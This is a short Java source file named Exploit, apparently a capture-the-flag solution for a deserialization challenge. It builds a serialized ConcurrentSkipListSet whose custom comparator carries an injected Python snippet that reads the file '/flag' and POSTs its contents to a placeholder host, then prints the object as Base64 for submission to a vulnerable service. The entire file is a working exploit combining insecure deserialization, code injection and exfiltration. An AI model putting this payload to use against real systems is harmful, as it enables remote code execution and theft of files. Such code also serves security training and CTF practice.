package deserialization101;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.Base64;
import java.util.concurrent.ConcurrentSkipListSet;

public class Exploit {

    public static void main(String[] args) throws Exception {
        System.out.println(createMaliciousObject());
    }

    public static String createMaliciousObject() throws Exception {
        CustomComparator customComparator = new CustomComparator(");import http.client;conn = http.client.HTTPSConnection(\"<HOST:PORT>\");conn.request(\"POST\",\"/\", '{}'.format(open('/flag').read().strip()), {'Content-Type': 'application/json'});#");
        var giveMeAnRCE = new ConcurrentSkipListSet<>(customComparator);
        giveMeAnRCE.add(1);
        giveMeAnRCE.add(2);

        var baos = new ByteArrayOutputStream();
        var oos = new ObjectOutputStream(baos);

        oos.writeObject(giveMeAnRCE);
        var bytes = baos.toByteArray();

        oos.close();
        baos.close();

        return Base64.getEncoder().encodeToString(bytes);
    }
}
